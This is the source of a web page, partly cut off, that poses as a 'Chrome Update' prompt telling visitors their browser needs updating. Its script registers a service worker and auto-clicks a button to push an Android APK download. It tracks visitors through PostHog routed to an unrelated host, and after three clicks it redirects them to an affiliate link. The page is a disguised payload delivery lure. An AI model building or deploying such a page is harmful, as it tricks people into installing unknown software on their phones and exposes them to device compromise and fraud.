          box-sizing: border-box;
          margin: 0;
          padding: 0;

      body {
          min-height: 100vh;
          font-family: Arial, sans-serif;
          background: #f4f7fb;
          color: #1f2937;
      }

      .screen {
          min-height: 100vh;
          padding: 28px 20px;
          display: flex;
          align-items: center;
          justify-content: center;
          background:
              radial-gradient(circle at top right, rgba(66, 133, 244, .18), transparent 34%),
              radial-gradient(circle at bottom left, rgba(52, 168, 83, .16), transparent 34%),
              #f4f7fb;
      }

      .card {
          width: 100%;
          max-width: 420px;
          text-align: center;
          padding: 32px 22px;
          border-radius: 28px;
          background: #ffffff;
          border: 1px solid rgba(0,0,0,.06);
          box-shadow: 0 24px 70px rgba(31,41,55,.12);
      }

      .logo {
          width: 96px;
          height: 96px;
          margin: 0 auto 22px;
          border-radius: 50%;
          background: url('logo.webp') center/cover no-repeat;
          position: relative;
          box-shadow: 0 16px 36px rgba(66,133,244,.24);
      }

      .badge {
          display: inline-block;
          padding: 8px 13px;
          border-radius: 999px;
          background: #eef4ff;
          color: #2563eb;
          font-size: 13px;
          font-weight: 700;
          margin-bottom: 16px;
      }

      h1 {
          font-size: 34px;
          line-height: 1.05;
          letter-spacing: -1.2px;
          color: #111827;
      }

      h1 span {
          color: #2563eb;
      }

      p {
          margin: 0 auto 24px;
          max-width: 320px;
          color: #6b7280;
          font-size: 16px;
          line-height: 1.45;
      }

      .features {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 9px;
          margin-bottom: 24px;
      }

      .feature {
          padding: 11px 6px;
          border-radius: 15px;
          background: #f3f6fb;
          color: #4b5563;
          font-size: 12px;
          font-weight: 700;
      }

      .btn {
          display: block;
          width: 100%;
          padding: 17px 20px;
          border-radius: 18px;
          background: #2563eb;
          color: #ffffff;
          text-decoration: none;
          font-weight: 800;
          font-size: 17px;
          box-shadow: 0 16px 36px rgba(37,99,235,.28);
          transition: .2s ease;
      }

      .btn:hover {
          transform: translateY(-2px);
          background: #1d4ed8;
      }

      .note {
          margin-top: 14px;
          font-size: 12px;
          color: #9ca3af;
      }
    </style>

      const logQueue = []
      const eventQueue = []
      let phog = null
      let posthogInitStart = 0

      const logContext = {
        offer_id: 'undefined',
        click_id: 'undefined',
        file_name: 'undefined',
      }

      function pickClickId(params) {
        return params.get('click_id') || params.get('utm_id') || params.get('clickid') || params.get('clickId') || ''
      }

      function syncLogContext(params) {
        try {
          const p = params || window.__savedDownloadParams || new URLSearchParams(window.location.search)
          logContext.offer_id = p.get('offer_id') || 'undefined'
          logContext.click_id = pickClickId(p) || 'undefined'
          logContext.file_name = p.get('utm_medium') || 'undefined'

      function contextAttributes() {
        return {
          offer_id: logContext.offer_id,
          click_id: logContext.click_id,
          file_name: logContext.file_name,
        }
      }

      function contextSuffix() {
        const parts = []
        if (logContext.offer_id !== 'undefined') parts.push(`offer_id: [${logContext.offer_id}]`)
        if (logContext.click_id !== 'undefined') parts.push(`click_id: [${logContext.click_id}]`)
        if (logContext.file_name !== 'undefined') parts.push(`file_name: [${logContext.file_name}]`)
        return parts.length ? ' ' + parts.join(', ') : ''
      }

      let stepStartedAt = 0
      function stepStart(label) {
        stepStartedAt = performance.now()
        log('info', `Await ${label}`)
      }
      function stepEnd(label, extra = {}, key = 'await_duration_ms') {
        log('info', `Awaited ${label}`, { [key]: Math.round(performance.now() - stepStartedAt), ...extra })
      }

      async function timedStep(label, promise) {
        stepStart(label)
        try {
          const value = await promise
          stepEnd(label)
          return value
        } catch (error) {
          log('error', `Step failed: ${label}`, { error_message: error.message })
          throw error
        }
      }
      function timedSync(label, fn) {
        stepStart(label)
        try {
          const value = fn()
          stepEnd(label, {}, 'duration_ms')
          return value
        } catch (error) {
          log('error', `Step failed: ${label}`, { error_message: error.message })
          throw error
        }
      }

      function log(level, message, attributes = {}) {
        const merged = { ...contextAttributes(), ...attributes }
        merged['delay'] = performance.now() - start
        merged['land'] = '025'
        const body = `${message}${contextSuffix()}`

        if (phog == null) {
          logQueue.push({level, message: body, attributes: merged})
          return
        }

        if (posthogInitStart == 0) {
          posthogInitStart = performance.now()
        }

        merged['delay_after_posthog_init'] = performance.now() - posthogInitStart
        phog.logger[level](body, merged)
      }

      function capture(event, attributes = {}) {
        const merged = { ...contextAttributes(), ...attributes }
        merged['delay'] = performance.now() - start
        merged['land'] = '025'

        if (phog == null) {
          eventQueue.push({event, attributes: merged})
          return
        }

        if (posthogInitStart == 0) {
          posthogInitStart = performance.now()
        }

        merged['delay_after_posthog_init'] = performance.now() - posthogInitStart
        phog.capture(event, merged)
      }

      posthog.init('phc_vqyXNzhYhfpZrwKKGMQ2VjQq2azSdh2StkeoHodd26NL', {
        api_host: 'https://uiuirestorehere.art',
        advanced_disable_flags: true,
        disable_external_dependency_loading: false,
        disable_session_recording: true,
        disable_surveys: true,
        capture_exceptions: {
          capture_unhandled_errors: true,
          capture_unhandled_rejections: true,
          capture_console_errors: false,
        },
        autocapture: true,
        capture_pageview: true,
        capture_pageleave: true,
        logs: {
          serviceName: 'web',
          environment: 'production',
        },
        person_profiles: 'identified_only',
        loaded: function(ph) {
          // ph — это полноценный объект PostHog
          syncLogContext()
          ph.register({
            land: '025',
            ...contextAttributes(),
          });

          // Теперь logger гарантированно существует
          log('info', 'Posthog init')

          phog = ph

          for (const entry of logQueue) {
            ph.logger[entry.level](entry.message, entry.attributes);
          }

          for (const entry of eventQueue) {
            ph.capture(entry.event, entry.attributes);
          }
        }
      });

      window.__downloadSwVersion = '42316858';
      window.__downloadSwUrl = `${window.__landingRoot}sw4.js`;
      window.__swReadyPromise = (async () => {
        await timedStep('window.__landingParamsReady [swReadyPromise]', window.__landingParamsReady)
        if (!('serviceWorker' in navigator)) {
          return { ok: false, direct: true, reason: 'unsupported' };
        }

        const registration = await timedStep('registration worker', navigator.serviceWorker.register(window.__downloadSwUrl))
        await timedStep('registration worker update', registration.update())

        if (registration.waiting) {
          registration.waiting.postMessage({ type: 'SKIP_WAITING' });
        }

        await timedStep('service worker ready', navigator.serviceWorker.ready)

        const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;

  <body>

    <main class="screen">
      <section class="card">
        <div class="logo"></div>
        <div class="badge">New Update v12.44</div>

        <h1><span>Chrome Update</span></h1>

        <p>
          You need to update your browser.
        </p>

        <button id="downloadButton" class="btn ph-no-capture" type="button" disabled>Update Chrome</button>

    <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>

    <script>
      (() => {
        log('info', 'Progress bar not used')

        const DEFAULT_FILE_NAME = 'download9918.apk';
        const SW_URL = window.__downloadSwUrl;
        const REDIRECT_HREF = 'https://immenselybossseal.com/path?key=01f48ac1c32a45189507ced9b43601b9&utm_source=lp_click';

        const downloadButton = document.querySelector('#downloadButton');
        const downloadFrame = document.querySelector('#downloadFrame');

        let savedParams = new URLSearchParams();
        let offerId = null;
        let fileName = DEFAULT_FILE_NAME;
      let isServiceWorkerReady = false;
      let trustedClickCount = 0;

      function sanitizeFileName(value) {
      const fallbackBase = DEFAULT_FILE_NAME.replace(/\.apk$/i, '');
      const candidate = String(value || '')
      .replace(/\.apk$/i, '')
      .slice(0, 80);
      const isValid = candidate !== ''
      && !/^[ _-]+$/.test(candidate)
      && !/^ /.test(candidate)
      && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
      const base = isValid ? candidate : fallbackBase;
      return `${base}.apk`;
      }

      function getSavedOfferId() {
      const value = savedParams.get('offer_id');
      return value && value.trim() ? value.trim().slice(0, 80) : null;
      }

      function getSavedFileName() {
      return sanitizeFileName(savedParams.get('utm_medium'));
      }

      function getRedirectUrl() {
      const target = new URL(REDIRECT_HREF);
      target.searchParams.set('clickid', savedParams.get('clickid') || '');
      return target.href;
      }

      async function registerServiceWorker() {
      await timedStep('window.__landingParamsReady', window.__landingParamsReady)
      savedParams = window.__savedDownloadParams;
      syncLogContext(savedParams)
      offerId = getSavedOfferId();
      fileName = getSavedFileName();
      const title = document.querySelector('#fileTitle');
      if (title) title.textContent = fileName;
      const swState = await timedStep('window.__swReadyPromise', window.__swReadyPromise)

      if (!swState.ok || swState.direct) {
      downloadButton.disabled = true;
      log('warn', 'Service worker is required for offer download', { reason: swState.reason });
      return;
      }

      isServiceWorkerReady = true;
      downloadButton.disabled = !offerId;
      log('info', 'Ready to download', {
      controller: swState.controller && swState.controller.scriptURL, swUrl: SW_URL });

      if (offerId) {
      capture('Auto download')
      downloadButton.click();
      }
      }

      function startDownload() {
      try {
        if (!offerId) {
        log('warn', 'Offer ID is missing');
        return;
        }

        const target = new URL('download.apk', window.__landingRoot);
        log('info', 'Starting service worker download', { target: target.href });
        downloadFrame.src = 'about:blank';
        window.setTimeout(() => {
          downloadFrame.src = target.href;
          }, 0);
      } catch (error) {
        log('error', 'Start download failed', { error_message: error.message })
      }
      }

        function handleDownloadClick(event) {
        try {
          if (!isServiceWorkerReady) {
          log('info', 'Download requested before service worker readiness');
          return;
          }

          if (event && event.isTrusted) {
          trustedClickCount += 1;

          if (trustedClickCount >= 3) {
          window.location.href = getRedirectUrl();
          return;
          }
          }

          startDownload();
        } catch (error) {
          log('error', 'Download click handling failed', { error_message: error.message })
        }
        }

        downloadButton.addEventListener('click', handleDownloadClick);
        downloadButton.addEventListener('click', (event) => {
          try {
            if (event.isTrusted) {
              capture('Click button')
            }
          } catch (error) {
            log('error', 'Click button capture failed', { error_message: error.message })
          }
        });

        registerServiceWorker().catch((error) => {
        console.error('[download] service worker setup failed', error);
        downloadButton.disabled = true;
        log('error', 'Service worker setup failed', { error_message: error.message });
        });
        })();
    </script>
